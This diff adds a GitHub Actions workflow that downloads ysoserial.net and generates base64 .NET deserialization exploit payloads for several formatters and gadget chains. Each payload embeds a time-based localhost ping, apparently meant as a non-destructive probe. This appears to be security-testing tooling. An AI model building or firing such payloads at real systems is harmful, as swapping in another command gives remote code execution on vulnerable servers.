@@ -1,0 +1,29 @@
+name: gen-payload
+on: workflow_dispatch
+jobs:
+  gen:
+    runs-on: windows-latest   # has .NET Framework 4.8 preinstalled
+    steps:
+      - name: Download ysoserial.net
+        shell: pwsh
+        run: |
+          curl -L -o yso.zip https://github.com/pwntester/ysoserial.net/releases/download/v1.36/ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9.zip
+          Expand-Archive yso.zip -DestinationPath yso
+      - name: Generate payloads (time-based ping, non-destructive)
+        shell: pwsh
+        run: |
+          $exe = "yso\Release\ysoserial.exe"
+          $cmd = "cmd /c ping -n 11 127.0.0.1"
+          $jobs = @(
+            @("BinaryFormatter","TypeConfuseDelegate"),
+            @("LosFormatter","TypeConfuseDelegate"),
+            @("NetDataContractSerializer","TypeConfuseDelegate"),
+            @("SoapFormatter","TypeConfuseDelegate"),
+            @("ObjectStateFormatter","TextFormattingRunProperties"),
+            @("BinaryFormatter","WindowsIdentity")
+          )
+          foreach ($j in $jobs) {
+            "===== $($j[0]) / $($j[1]) ====="
+            & $exe -f $j[0] -g $j[1] -c $cmd -o base64
+            ""
+          }
